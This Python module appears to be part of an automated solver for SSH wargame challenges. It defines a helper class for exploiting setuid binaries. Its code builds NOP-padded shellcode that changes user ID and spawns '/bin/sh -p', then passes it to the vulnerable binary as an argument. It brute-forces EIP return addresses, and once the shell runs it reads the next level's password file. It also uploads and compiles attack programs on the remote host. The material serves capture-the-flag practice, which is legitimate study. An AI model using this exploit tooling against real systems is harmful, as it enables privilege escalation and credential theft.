from time import sleep

from pwn import asm, shellcraft

from .ChallengeSSH import ChallengeSSH


class ChallengeBinary(ChallengeSSH):

    USER_ID_FORMAT = None       # Must be defined by subclass

    BINARY_TO_EXEC = None       # Must be defined by subclass

    def __init__(self, *args, **kwargs):
        assert(self.USER_ID_FORMAT is not None)
        assert(self.BINARY_TO_EXEC is not None)

        super().__init__(*args, **kwargs)

    @staticmethod
    def convert_addr_to_bytes_le(addr):
        if addr.startswith('0x'):
            addr = addr[2:]

        return bytes(bytearray.fromhex(addr)[::-1])

    @property
    def binary_to_exec(self):
        return self.BINARY_TO_EXEC % (self._id)

    @property
    def user_id(self):
        return self.USER_ID_FORMAT % (self._id)

    @property
    def user_id_next(self):
        return self.USER_ID_FORMAT % (self._id + 1)

    def get_padded_payload(self, payload, buffer_overflow_size, padding_size=0):
        assert(buffer_overflow_size >= len(payload))
        assert(padding_size <= buffer_overflow_size)

        pad_left = asm(shellcraft.nop()) * padding_size
        pad_right = asm(shellcraft.nop()) * (buffer_overflow_size - len(payload) - padding_size)

        return pad_left + payload + pad_right

    def get_shellcode(self, change_uid_func=None):
        assert(change_uid_func is None or
               isinstance(change_uid_func, str) or
               callable(change_uid_func))

        raw = ''

        if change_uid_func is not None:
            if isinstance(change_uid_func, str):
                func = getattr(shellcraft, change_uid_func)
            else:
                func = change_uid_func
            raw += func(self.user_id_next)

        raw += shellcraft.execve("/bin/sh", ["/bin/sh", "-p"])      # Do not use shellcraft.sh() directly as it does not work with setuid

        return asm(raw)

    def _exec_shellcode(self, shellcode_payload=None, additionnal_params='',
                        clear_env=False, catch_signal=None, **kwargs):
        assert(shellcode_payload is not None)
        assert(catch_signal is None or catch_signal in ('TERM', 'USR1', 'USR2')), f'Signal "{catch_signal}" is not supported'

        shellcode_payload = str(shellcode_payload).replace("'", '"')

        cmd_prefix = ''
        if catch_signal is not None:
            cmd_prefix = f'trap "" {catch_signal} ; '

        if clear_env:
            cmd_prefix += 'env - '

        cmd = f'''{cmd_prefix}{self.binary_to_exec} $(python3 -c 'import sys; sys.stdout.buffer.write({shellcode_payload})') {additionnal_params}'''

        return self.exec_cmd_raw(cmd, **kwargs)

    def exec_shellcode_to_get_pass(self, shellcode_payload, waiting_for_shell=0.0, **kwargs):

        output = f'{self.remote_work_dir}/output'
        additionnal_params = kwargs.get('additionnal_params', '') + f' > {output}'

        stdin, _, _ = self._exec_shellcode(shellcode_payload=shellcode_payload, additionnal_params=additionnal_params, **kwargs)

        sleep(waiting_for_shell)

        stdin.write('echo ""\n')    # Start a new line
        stdin.write('whoami\n')     # Used to control that the privilege escalation was successful
        stdin.write(f'cat {self.next_pass_filename}\n')
        stdin.write('exit\n')
        stdin.flush()

        stdout, _ = self.exec_cmd(f'''cat {output}''')
        assert(len(stdout) >= 2), f'Unexpected output: {stdout}'

        whoami = stdout[-2].strip()
        passwd = stdout[-1].strip()

        assert(whoami == self.ssh_user_next), f'Unexpected whoami: {whoami} != {self.ssh_user_next}'

        return passwd

    def find_eip_addresses(self, payload_prefix, estimated_eip_address, payload_suffix = b'',
                           not_found_range=b'\x00\x10\x00\x00', found_count_max=1, **kwargs):

        addr_int = int.from_bytes(estimated_eip_address, 'little')
        range_int = int.from_bytes(not_found_range, 'little')

        found = []

        try:
            for step in [1, -1]:
                for i, cur_addr in enumerate(range(addr_int, addr_int + (range_int * step), step)):
                    eip_address = self.convert_addr_to_bytes_le(hex(cur_addr))

                    step_str = 'FW' if step == 1 else 'BW'
                    self.log(f'    - ({step_str}) #{i:03} Trying with "{" ".join([f"0x{b:02x}" for b in eip_address])}"...', end='\r')

                    payload = payload_prefix + eip_address + payload_suffix
                    payload = str(payload).replace("'", '"')

                    stdin, stdout, _ = self._exec_shellcode(shellcode_payload=payload, quiet=True, **kwargs)
                    while not stdout.channel.exit_status_ready():
                        sleep(.1)
                        if not stdin.channel.closed:
                            stdin.write('exit 42\n')
                            stdin.flush()

                    exit_code = stdout.channel.recv_exit_status()
                    if exit_code == 42:
                        found.append(eip_address)
                        if len(found) >= found_count_max:
                            # Max found reached, stop both loops
                            raise StopIteration
        except StopIteration:
            pass

        if len(found) == 0:
            raise RuntimeError('No EIP address found')

        if found_count_max == 1 and i == 0:
            msg = f'Estimated EIP address "{" ".join([f"0x{b:02x}" for b in estimated_eip_address])}" is correct'
        else:
            msg = f'EIP address(es) found: {found} (please select one of them to speed up the challenge)'

        self.log(f'    - {msg}' + ' ' * 100)

        return found

    def deploy_attack_app(self, filename, content, compilation_needed=False):
        assert(not filename.startswith(self.remote_work_dir))

        output_filename = f'{self.remote_work_dir}/{filename}'
        source_filename = f'{self.remote_work_dir}/source_{filename}.c' if compilation_needed else output_filename

        with self.ssh_client.open_sftp() as ftp:
            with ftp.file(source_filename, 'w', -1) as remote_file:
                remote_file.write(content)
                remote_file.flush()

        if compilation_needed:
            _, stdout, _ = self.exec_cmd_raw(f'TMPDIR="{self.remote_work_dir}" gcc -o "{output_filename}" "{source_filename}"')
            if stdout.channel.recv_exit_status() != 0:
                raise RuntimeError('Compilation failed')
        else:
            self.exec_cmd(f'[ -x "{output_filename}" ] || chmod +x {output_filename}')

        _, stdout, _ = self.exec_cmd_raw(f'[ -x "{output_filename}" ]')
        if stdout.channel.recv_exit_status() != 0:
            raise RuntimeError(f'{output_filename} was not created correctly')

        return output_filename
